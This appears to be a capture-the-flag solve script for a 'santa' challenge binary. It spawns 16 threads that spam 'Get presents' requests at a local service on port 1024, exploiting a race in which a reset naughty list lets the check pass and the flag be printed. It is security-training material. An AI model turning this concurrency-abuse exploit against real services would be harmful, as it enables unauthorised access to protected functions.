#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/santa')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

# when a new instance starts, length of nauthy list is set to 0, so the function check_naughty_list() returns true

# so just spam Get presents
def get_presents():
    while True:
        try:
            with socket.create_connection(('127.0.0.1', 1024)) as so:
                response = b''
                while b'What do you want to do?\n> ' not in response:
                    response += so.recv(1024)
                so.sendall(b'Get presents\n')
                response = so.recv(1024)
                if b'softsec' in response:
                    print(response)
        except:
            continue


for _ in range(15):
    t = threading.Thread(target=get_presents)
    t.start()


t = threading.Thread(target=get_presents)
t.start()
t.join()